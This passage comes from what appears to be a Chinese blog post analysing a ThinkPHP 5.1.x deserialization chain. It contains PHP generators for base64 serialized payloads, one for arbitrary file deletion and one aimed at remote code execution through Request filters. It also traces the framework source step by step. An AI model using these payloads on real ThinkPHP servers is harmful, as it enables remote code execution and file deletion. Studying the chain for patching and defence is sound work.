[&quot;var_ajax&quot;&#x3D;&gt;&#39;Mengd@&#39;];</span><br><span class="line">        $this-&gt;hook &#x3D; [&quot;visible&quot;&#x3D;&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\concern\Conversion;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files &#x3D; [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files&#x3D;[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br></pre></td></tr></table></figure><h4 id="Go"><a href="#Go" class="headerlink" title="Go!"></a>Go!</h4><p>construct()和destruct()永远是我们优先考虑的对象，因为他们是必然触发的。在对象被实例化的时候触发construct(),在对象被销毁的时候调用destruct()。</p><p>而本次序列化的入口来自thinkphp/library/think/proccess/pipes/Windows.php，在代码的第56行有一个destruct函数</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210410160753490.png" class title="image-20210410160753490"><p>在windows类被销毁时会调用两个方法，close()，removeFiles()</p><h2 id="0X03-POP链上的任意文件删除"><a href="#0X03-POP链上的任意文件删除" class="headerlink" title="0X03:POP链上的任意文件删除"></a>0X03:POP链上的任意文件删除</h2><p>跟进close()没有发现往下走的可能</p><p>跟进removeFiles()我们发现代码是这样子的</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210410161120513.png" class title="image-20210410161120513"><p>这个地方首先遍历了一下$this-&gt;files,这里的$this-&gt;files是我们可控的，那么$filename也是我们可控的。然后此处就存在任意文件删除，只要我控制$this-&gt;files为文件路径，那么就可以删除这个文件。我们进行尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\Process;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files&#x3D;[];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files&#x3D;[&quot;D:\phpStudy\PHPTutorial\\1.txt&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Windows();</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210410162157003.png" class title="image-20210410162157003"><p>将payload打过去过后对应目录下的1.txt消失，任意文件删除成功。</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210410162321214.png" class title="image-20210410162321214"><p><img src="/D:/hexo\source_posts\ThinkPhp5-1-x反序列化漏洞分析利用\image-20210410162356405.png" alt="image-20210410162356405"></p><p>这只是在审计这个链开头遇到的一个小意外，我们还没开始进入真正的pop链分析呢</p><h2 id="0X04：整个链的分析"><a href="#0X04：整个链的分析" class="headerlink" title="0X04：整个链的分析"></a>0X04：整个链的分析</h2><p>回到刚才，在文件删除的时候会先调用file_exists来判断文件是否存在，而正是这个函数给我我们提供了往下走的可能。</p><p>查看官方文档对file_exists函数的描述：</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210410162652207.png" class title="image-20210410162652207"><p>官方文档很明确的告诉我们，<strong>file_exists需要的是一个字符串类型的数据，也就是说file_exists会将传入他的数据当作字符串进行解析。</strong>到这我们自然便会联想到__toString()魔术方法，当一个对象被当作字符串解析的时候便会调用toString()那么，而这里的filename又是我们完全可控的，所以我们就能够通过控制filename的值为一个对象来实现调用任意类的toString()方法。</p><p>全局搜索__toString()方法，在Conversion.php中发现toString方法中调用了toJson()，可是我们这个Conversion类是一个trait</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210410193059103.png" class title="image-20210410193059103"><p>什么是trait呢？trait是php的一个特性，简单的来说，可以通过use关键字来组合不同的trait以解决PHP无法同时从两个基类中继承属性和方法的问题，<strong>trait是不可被实例化的</strong>。</p><p>要想出发到Conversion.php中的toString方法，我们必须要找到use了他的类，经过我们寻找，</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210410193543500.png" class title="image-20210410193543500"><p>在Model.php中一个抽象类Model中use了Conversion可是Model类是一个抽象类呀，<strong>抽象类是不可以被实例化的</strong>。所以我们继续寻找继承了Model类的子类，终于，我们在Pivot.php中找到了一个Pivot类，它继承自Model类</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210410194043032.png" class title="image-20210410194043032"><p>现在类找到了，只要我们将$filename变为Pivot类的实例化对象，那么就会运行到Conversion的toString()方法，达到我们的目的。</p><p>现在我们接着分析Conversion。</p><p>来到Conversion的toString方法如下：</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210412204818821.png" class title="image-20210412204818821"><p>调用了toJson()方法，我们继续跟进toJson方法：</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210412204909060.png" class title="image-20210412204909060"><p>toJson方法调用了toArray方法，继续跟进，toArray是我们重点分析对象，该方法代码块内容较长，只列出了重点分析的段落，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">    public function toArray()</span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">    ........部分源码被省略，利用连重点在如下部分。</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; 追加属性（必须定义获取器）</span><br><span class="line">        if (!empty($this-&gt;append)) &#123;</span><br><span class="line">            echo (&quot;append第一次的值为:&quot;);</span><br><span class="line">            var_dump($this-&gt;append);</span><br><span class="line">            echo (&quot;&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line">            foreach ($this-&gt;append as $key &#x3D;&gt; $name) &#123;</span><br><span class="line"></span><br><span class="line">                echo (&#39;key为:&#39;);</span><br><span class="line">                var_dump($key);</span><br><span class="line">                echo (&quot;&lt;br&gt;&quot;);</span><br><span class="line">                echo (&#39;name为:&#39;);</span><br><span class="line">                var_dump($name);</span><br><span class="line">                echo (&quot;&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line">                if (is_array($name)) &#123;</span><br><span class="line">                    &#x2F;&#x2F; 追加关联对象属性</span><br><span class="line">                    $relation &#x3D; $this-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                    if (!$relation) &#123;</span><br><span class="line">                        $relation &#x3D; $this-&gt;getAttr($key);</span><br><span class="line">&#x2F;&#x2F;                        echo &quot;relation为：&quot;;</span><br><span class="line">&#x2F;&#x2F;                        var_dump($relation);</span><br><span class="line">                        $relation-&gt;visible($name);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $item[$key] &#x3D; $relation-&gt;append($name)-&gt;toArray();</span><br><span class="line">                &#125; elseif (strpos($name, &#39;.&#39;)) &#123;</span><br><span class="line">                    list($key, $attr) &#x3D; explode(&#39;.&#39;, $name);</span><br><span class="line">                    &#x2F;&#x2F; 追加关联对象属性</span><br><span class="line">                    $relation &#x3D; $this-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                    if (!$relation) &#123;</span><br><span class="line">                        $relation &#x3D; $this-&gt;getAttr($key);</span><br><span class="line">                        $relation-&gt;visible([$attr]);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $item[$key] &#x3D; $relation-&gt;append([$attr])-&gt;toArray();</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $item[$name] &#x3D; $this-&gt;getAttr($name, $item);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $item;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到在这个地方我在多出打印出了key,name,relation的值，他们在整个利用链中至关重要，也在无时无刻发生变化，需要重点关注。接下来我们来进行分析。</p><h4 id="1-toArray-中的-this-gt-append"><a href="#1-toArray-中的-this-gt-append" class="headerlink" title="1.toArray()中的$this-&gt;append"></a>1.toArray()中的$this-&gt;append</h4><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210412210617571.png" class title="image-20210412210617571"><p>首先，一开始就对$this-&gt;append进行了循环，$this-&gt;append是我们在payload中的可控参数，他的值为[“Mengd@”=&gt;[‘bcc’, ‘bcc’]]他是一个拥有一个键名为Mengd@键值为[‘bcc’,’bcc’]数组的二维数组。经过第一个foreach后$key的值为Mengd@，$name的值为[‘bcc’,’bcc’]。</p><h4 id="2-toArray-中的-this-gt-getRelation-key"><a href="#2-toArray-中的-this-gt-getRelation-key" class="headerlink" title="2.toArray()中的$this-&gt;getRelation($key)"></a>2.toArray()中的$this-&gt;getRelation($key)</h4><p>在刚刚从$this-&gt;append中取出$key为Mengd@后，再经过一次if判断$name是否为数组：</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210412210708363.png" class title="image-20210412210708363"><p>紧接着便带着这个数据进入了，$this-&gt;getRelation($key)，这里面的代码为：</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210412210737444.png" class title="image-20210412210737444"><p>可以看见，传入的$key不为空，所以getRelation中的$name也不为空，if条件中为假，由于relation此时没有值，elseif也无法触发，直接return返回null，此时，$relation为null</p><h4 id="3-toArray-中的-this-gt-getAttr-key"><a href="#3-toArray-中的-this-gt-getAttr-key" class="headerlink" title="3.toArray()中的$this-&gt;getAttr($key)"></a>3.toArray()中的$this-&gt;getAttr($key)</h4><p>刚刚经过经过了getReation()，此时的$relation为空，紧接着便调用了$relation=$this-&gt;getAttr($key)，代码如下：</p><p>此段代码也很长，我将其简化成如下格式，在尝试执行$value=$this-&gt;$this-&gt;getData($name)(此时的$name等于传入的$key等于Mengd@)后，经过一些列省略号的操作便返回了$value，那其中$this-&gt;data()变成了我们主要关注的对象，我们跟进getData($name)一探究竟。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  public function getAttr($name, &amp;$item &#x3D; null)</span><br><span class="line">  &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">          $notFound &#x3D; false;</span><br><span class="line">          $value    &#x3D; $this-&gt;getData($name);</span><br><span class="line">      &#125; catch (InvalidArgumentException $e) &#123;</span><br><span class="line">          $notFound &#x3D; true;</span><br><span class="line">          $value    &#x3D; null;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line"></span><br><span class="line">      return $value;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="4-Attribute中的getData"><a href="#4-Attribute中的getData" class="headerlink" title="4.Attribute中的getData"></a>4.Attribute中的getData</h4><p>刚刚调用到getData($name),代码如下：</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210412212158200.png" class title="image-20210412212158200"><p>此时$name为Mengd@,$this-&gt;data=[“Mengd@”=&gt;new Request()]，触发第二个if语句，直接返回$this-&gt;data[$name]，</p><p>那么$value=$this-&gt;data[$name]，因为$this-&gt;data，$name都是我们可控的，所以$value可控进而$relation可控，此时$relation的值为Request()对象。</p><h4 id="5-寻找RCE的足迹"><a href="#5-寻找RCE的足迹" class="headerlink" title="5.寻找RCE的足迹"></a>5.寻找RCE的足迹</h4><p>刚刚提到我们可以通过控制$this-&gt;data，$name进而起到控制$relation的作用。紧接着我们就要调用$relation-&gt;visible($name)方法了，前面提到了__call魔术方法，当对象调用不存在的方法的时候会自动调用，这里我们可以控制$relation为任意值了，那么有没有那个对象的visable方法或者哪个对象的call魔术方法存在rce的可能呢？前者没有希望，那我们考虑下后者。通过全局搜索call魔术方法，我们发现在Requests.php的Requests类中存在一个call魔术方法，他是这样写的：</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210413011137060.png" class title="image-20210413011137060"><p>这里的$method我们不可控，值为visable，$this-&gt;hook是可控的，于是我们就产生了个想法，如果在这个地方控制$this-&gt;hook的值为</p><p>[‘visable’=&gt;’system’]那么这里的函数就变成了call_user_func_array(‘system’,$args)，这里的$args就是Conversion中的$name，而它的值为[‘bcc’,’bcc’],是我们可控的。可是在调用call_user_func_array之前我还调用了array_unshift($this,$this)他将$this放到了$args的最前面，所以$args就变成了[‘$this’,’bcc’,’bcc’]无法实现RCE。</p><h4 id="6-利用call里面的call-user-func-array作为跳板，寻找新的链"><a href="#6-利用call里面的call-user-func-array作为跳板，寻找新的链" class="headerlink" title="6.利用call里面的call_user_func_array作为跳板，寻找新的链"></a>6.利用call里面的call_user_func_array作为跳板，寻找新的链</h4><p>虽然在call当中不能直接执行rce，但是$this-&gt;hook[$method]是我们完全可控的，我们可以控制他为一个新的方法，绕过$args，寻找新的RCE出发点。在Request类中，搜索危险函数，一个函数引起来的我的注意，filterValue()他的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">private function filterValue(&amp;$value, $key, $filters)</span><br><span class="line">&#123;</span><br><span class="line">    $default &#x3D; array_pop($filters);</span><br><span class="line"></span><br><span class="line">    foreach ($filters as $filter) &#123;</span><br><span class="line">        if (is_callable($filter)) &#123;</span><br><span class="line">            &#x2F;&#x2F; 调用函数或者方法过滤</span><br><span class="line">            echo &quot;filter为:&quot;.$filter.&quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;value为:&quot;.$value;</span><br><span class="line">            &#x2F;&#x2F;最终触发RCE的点，但因为其都不可控，通过别的方法间接触发</span><br><span class="line">            $value &#x3D; call_user_func($filter, $value);</span><br><span class="line">        &#125; elseif (is_scalar($value)) &#123;</span><br><span class="line">            if (false !&#x3D;&#x3D; strpos($filter, &#39;&#x2F;&#39;)) &#123;</span><br><span class="line">                &#x2F;&#x2F; 正则过滤</span><br><span class="line">                if (!preg_match($filter, $value)) &#123;</span><br><span class="line">                    &#x2F;&#x2F; 匹配不成功返回默认值</span><br><span class="line">                    $value &#x3D; $default;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; elseif (!empty($filter)) &#123;</span><br><span class="line">                &#x2F;&#x2F; filter函数不存在时, 则使用filter_var进行过滤</span><br><span class="line">                &#x2F;&#x2F; filter为非整形值时, 调用filter_id取得过滤id</span><br><span class="line">                $value &#x3D; filter_var($value, is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">                if (false &#x3D;&#x3D;&#x3D; $value) &#123;</span><br><span class="line">                    $value &#x3D; $default;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到这里存在一行代码,$value = call_user_func($filter,$value)乍一看过去我们没有可以控制的参数，但是我们可以通过寻找调用filterValue()的其他方法来间接调用filterValue()，如果可以通过他们控制参数，那便可以实现RCE。</p><h4 id="7-filterValue-的调用链"><a href="#7-filterValue-的调用链" class="headerlink" title="7.filterValue()的调用链"></a>7.filterValue()的调用链</h4><p>通过全局搜索filterValue，我发现Rquest中的input()方法调用过他，源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public function input($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)</span><br><span class="line">&#123;</span><br><span class="line">    if (false &#x3D;&#x3D;&#x3D; $name) &#123;</span><br><span class="line">        &#x2F;&#x2F; 获取原始数据</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name &#x3D; (string) $name;</span><br><span class="line">    if (&#39;&#39; !&#x3D; $name) &#123;</span><br><span class="line">        &#x2F;&#x2F; 解析name</span><br><span class="line">        if (strpos($name, &#39;&#x2F;&#39;)) &#123;</span><br><span class="line">            list($name, $type) &#x3D; explode(&#39;&#x2F;&#39;, $name);</span><br><span class="line">        &#125;</span><br><span class="line">        $data &#x3D; $this-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">        if (is_null($data)) &#123;</span><br><span class="line">            return $default;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (is_object($data)) &#123;</span><br><span class="line">            return $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 解析过滤器</span><br><span class="line">    $filter &#x3D; $this-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    if (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</span><br><span class="line">        if (version_compare(PHP_VERSION, &#39;7.1.0&#39;, &#39;&lt;&#39;)) &#123;</span><br><span class="line">            &#x2F;&#x2F; 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span><br><span class="line">            $this-&gt;arrayReset($data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($type) &amp;&amp; $data !&#x3D;&#x3D; $default) &#123;</span><br><span class="line">        &#x2F;&#x2F; 强制类型转换</span><br><span class="line">        $this-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现这里的$data，$name，$filter也没有控制的机会，继续往上寻找调用input()的类，全局搜索input，Request类中的</p><p>param方法调用了input()，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  public function param($name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)</span><br><span class="line">  &#123;</span><br><span class="line">      if (!$this-&gt;mergeParam) &#123;</span><br><span class="line">          $method &#x3D; $this-&gt;method(true);</span><br><span class="line"></span><br><span class="line">          &#x2F;&#x2F; 自动获取请求变量</span><br><span class="line">          switch ($method) &#123;</span><br><span class="line">              case &#39;POST&#39;:</span><br><span class="line">                  $vars &#x3D; $this-&gt;post(false);</span><br><span class="line">                  break;</span><br><span class="line">              case &#39;PUT&#39;:</span><br><span class="line">              case &#39;DELETE&#39;:</span><br><span class="line">              case &#39;PATCH&#39;:</span><br><span class="line">                  $vars &#x3D; $this-&gt;put(false);</span><br><span class="line">                  break;</span><br><span class="line">              default:</span><br><span class="line">                  $vars &#x3D; [];</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          &#x2F;&#x2F; 当前请求参数和URL地址中的参数合并</span><br><span class="line">          $this-&gt;param &#x3D; array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br><span class="line"></span><br><span class="line">          $this-&gt;mergeParam &#x3D; true;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (true &#x3D;&#x3D;&#x3D; $name) &#123;</span><br><span class="line">          &#x2F;&#x2F; 获取包含文件上传信息的数组</span><br><span class="line">          $file &#x3D; $this-&gt;file();</span><br><span class="line">          $data &#x3D; is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;</span><br><span class="line"></span><br><span class="line">          return $this-&gt;input($data, &#39;&#39;, $default, $filter);</span><br><span class="line">      &#125;</span><br><span class="line">&#x2F;&#x2F;此时的$this-&gt;param是一个数组，键名为get参数传参的变量名，键值为传参值。</span><br><span class="line">      return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>param里面也没有发现可控参数，全局搜索param，发现Requests类中的isAjax函数调用了他，于是我们来到isAjax一探究竟，源码如下：</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210413015634012.png" class title="image-20210413015634012"><p>我们可以发现调用param方法的时候传入的参数是$this-&gt;config[‘var_ajax’]这是我们可以控制的参数！他对应在param中的值就是</p><p>$name，让我们回到param方法最底部的**return $this-&gt;input($this-&gt;param,$name,$default,$filter)**，这里的$this-&gt;param是通过get传过去的所有参数，以参数名为键名参数值为键值所组成的一个数组。$name为我们的可控变量，$default为NULL,$filter为’’</p><p>带着这些数据我们进入了input方法，在input方法中存在这样一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (&#39;&#39; !&#x3D; $name) &#123;</span><br><span class="line">    &#x2F;&#x2F; 解析name</span><br><span class="line">    if (strpos($name, &#39;&#x2F;&#39;)) &#123;</span><br><span class="line">        list($name, $type) &#x3D; explode(&#39;&#x2F;&#39;, $name);</span><br><span class="line">    &#125;</span><br><span class="line">    $data &#x3D; $this-&gt;getData($data, $name);</span><br></pre></td></tr></table></figure><p>此时的$data的值为getData的返回值，我们带着$data，$name进入getData方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">protected function getData(array $data, $name)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;这里的name为Mengd@，val为Mengd@</span><br><span class="line">    foreach (explode(&#39;.&#39;, $name) as $val) &#123;</span><br><span class="line">        if (isset($data[$val])) &#123;</span><br><span class="line">            $data &#x3D; $data[$val];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，首先$name是我们可控的所以$val也是我们可控的，这里的$data形式为</p><p>[‘mengd@’=&gt;get传参的数据,’payload’=&gt;get传参的payload]</p><p>而又因为会取出$val对应键值的数据存入$data，$val我们又可控。所以这个地方$data就变成了我们可控的数据，在传参时参数名为Mengd@的数据就会保存金$data，对应我们的payload，<strong>此时$data的值为calc</strong>。</p><p>然后进入到input方法中的**$filter = $this-&gt;getFilter($filter, $default)**语句，代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 